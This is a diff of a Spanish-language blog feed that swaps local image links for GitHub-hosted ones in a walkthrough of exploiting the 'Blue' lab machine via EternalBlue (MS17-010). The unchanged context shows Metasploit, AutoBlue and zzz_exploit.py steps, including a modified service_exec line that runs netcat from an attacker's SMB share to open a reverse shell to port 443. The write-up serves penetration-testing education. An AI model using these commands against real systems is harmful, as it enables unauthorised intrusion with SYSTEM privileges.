@@ -30,7 +30,7 @@
 &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ping -c 1 &amp;lt;IP del host&amp;gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;&lt;img src=&quot;http://192.168.92.128:80/2.png&quot; alt=&quot;2&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2026-02-20-Blue-Practical-Ethical-Hacking/2.png&quot; alt=&quot;2&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;Una vez comprobamos que la máquina está activa (pues nos devuelve una respuesta), podemos también determinar a que tipo de máquina nos estamos enfrentando en base al valor del &lt;em&gt;TTL&lt;/em&gt;; en este caso el valor del &lt;em&gt;TTL&lt;/em&gt; de la máquina es &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;128&lt;/code&gt;, por lo que podemos intuir que estamos ante una máquina &lt;em&gt;Windows&lt;/em&gt;. Recordemos que algunos de los valores referenciales son los siguientes:&lt;/p&gt;
 
@@ -264,14 +264,14 @@ set RHOST &amp;lt;IP del host&amp;gt;
 exploit
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;&lt;img src=&quot;http://192.168.92.128:80/11.png&quot; alt=&quot;11&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2026-02-20-Blue-Practical-Ethical-Hacking/11.png&quot; alt=&quot;11&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;La ejecución del módulo nos devuelve una sesión &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Meterpreter&lt;/code&gt; desde la cual podemos interactuar con el sistema comprometido. Desde esta sesión es posible invocar una shell interactiva.&lt;/p&gt;
 
 &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;shell
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;&lt;img src=&quot;http://192.168.92.128:80/12.png&quot; alt=&quot;12&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2026-02-20-Blue-Practical-Ethical-Hacking/12.png&quot; alt=&quot;12&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;Al verificar el contexto de ejecución, observamos que el proceso se ejecuta como &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NT AUTHORITY\SYSTEM&lt;/code&gt;, es decir, con los máximos privilegios del sistema. Por tanto, no es necesario realizar ninguna escalada de privilegios adicional.&lt;/p&gt;
 
@@ -304,7 +304,7 @@ exploit
 
 &lt;p&gt;Una vez confirmada la escucha y continuada la ejecución, el exploit se ejecutará y obtendremos una shell interactiva dentro de la máquina víctima.&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;http://192.168.92.128:80/13.png&quot; alt=&quot;13&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2026-02-20-Blue-Practical-Ethical-Hacking/13.png&quot; alt=&quot;13&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
 
 &lt;h5 id=&quot;autoblue&quot;&gt;&lt;a href=&quot;#header-5&quot;&gt;&lt;/a&gt;AutoBlue&lt;/h5&gt;
 
@@ -322,7 +322,7 @@ exploit
 
 &lt;p&gt;Desde el menú interactivo seleccionaremos la opción para generar el &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;shellcode&lt;/code&gt; con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MSFvenom&lt;/code&gt;. Indicaremos nuestra dirección IP y, dado que el script no detecta automáticamente la arquitectura del sistema objetivo, nos solicitará el puerto en el que nos pondremos en escucha tanto para &lt;em&gt;64 bits&lt;/em&gt; como para 32 bits. Asimismo, seleccionaremos la opción para generar una shell interactiva en lugar de una sesión &lt;em&gt;Meterpreter&lt;/em&gt; y especificaremos que el payload sea de tipo &lt;em&gt;stageless&lt;/em&gt;.&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;http://192.168.92.128:80/14.png&quot; alt=&quot;14&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2026-02-20-Blue-Practical-Ethical-Hacking/14.png&quot; alt=&quot;14&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;Una vez generado el &lt;em&gt;shellcode&lt;/em&gt;, regresamos al directorio principal. Antes de ejecutar el exploit, debemos ponernos en escucha en el puerto previamente configurado, desde una nueva terminal:&lt;/p&gt;
 
@@ -336,7 +336,7 @@ exploit
 &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python eternalblue_exploit7.py &amp;lt;IP del host&amp;gt; shellcode/sc_x64.bin
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;&lt;img src=&quot;http://192.168.92.128:80/15.png&quot; alt=&quot;15&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2026-02-20-Blue-Practical-Ethical-Hacking/15.png&quot; alt=&quot;15&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
 
 &lt;h5 id=&quot;ms17-010&quot;&gt;&lt;a href=&quot;#header-5&quot;&gt;&lt;/a&gt;MS17-010&lt;/h5&gt;
 
@@ -356,19 +356,19 @@ exploit
 &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python2 checker.py
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;&lt;img src=&quot;http://192.168.92.128:80/16.png&quot; alt=&quot;16&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2026-02-20-Blue-Practical-Ethical-Hacking/16.png&quot; alt=&quot;16&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;Aunque las &lt;em&gt;null sessions&lt;/em&gt; están habilitadas, será necesario editar el script para especificar un usuario válido, por ejemplo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;guest&lt;/code&gt;. No será necesario indicar contraseña. Una vez realizado este ajuste, ejecutaremos nuevamente el script y se nos mostrarán los &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;named pipes&lt;/code&gt; disponibles que podremos utilizar durante la explotación.&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;http://192.168.92.128:80/17.png&quot; alt=&quot;17&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2026-02-20-Blue-Practical-Ethical-Hacking/17.png&quot; alt=&quot;17&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;http://192.168.92.128:80/18.png&quot; alt=&quot;18&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2026-02-20-Blue-Practical-Ethical-Hacking/18.png&quot; alt=&quot;18&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;Por defecto, el script &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;zzz_exploit.py&lt;/code&gt; crea un archivo pwned.txt en la máquina víctima, lo cual no nos resulta especialmente útil. Lo que haremos ahora será modificar este script, concretamente la función &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;smb_pwn()&lt;/code&gt;.&lt;/p&gt;
 
 &lt;p&gt;En primer lugar, especificaremos un usuario válido, de forma similar a como hicimos previamente con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;checker.py&lt;/code&gt;.&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;http://192.168.92.128:80/19.png&quot; alt=&quot;19&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2026-02-20-Blue-Practical-Ethical-Hacking/19.png&quot; alt=&quot;19&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;A continuación, comentaremos las líneas relacionadas con la creación del archivo y habilitaremos la llamada a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;service_exec()&lt;/code&gt;, adaptándola a nuestras necesidades.&lt;/p&gt;
 
@@ -379,7 +379,7 @@ exploit
 &lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nf&quot;&gt;service_exec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;conn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;sa&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;cmd /c \\&amp;lt;IP local&amp;gt;\smbFolder\nc64.exe -e cmd &amp;lt;IP local&amp;gt; 443&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;&lt;img src=&quot;http://192.168.92.128:80/20.png&quot; alt=&quot;20&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2026-02-20-Blue-Practical-Ethical-Hacking/20.png&quot; alt=&quot;20&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;Una vez modificado el script, el siguiente paso será descargar el binario de &lt;a href=&quot;https://eternallybored.org/misc/netcat/&quot;&gt;Netcat&lt;/a&gt; que vamos a compartir.&lt;/p&gt;
 
@@ -400,7 +400,7 @@ exploit
 
 &lt;p&gt;De esta forma, obtendremos una shell interactiva dentro de la máquina víctima con privilegios máximos, ejecutándose como &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NT AUTHORITY\SYSTEM&lt;/code&gt;.&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;http://192.168.92.128:80/21.png&quot; alt=&quot;21&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2026-02-20-Blue-Practical-Ethical-Hacking/21.png&quot; alt=&quot;21&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
 </description>
         <pubDate>Fri, 20 Feb 2026 00:00:00 -0500</pubDate>
         <link>/es/Blue-Practical-Ethical-Hacking/</link>
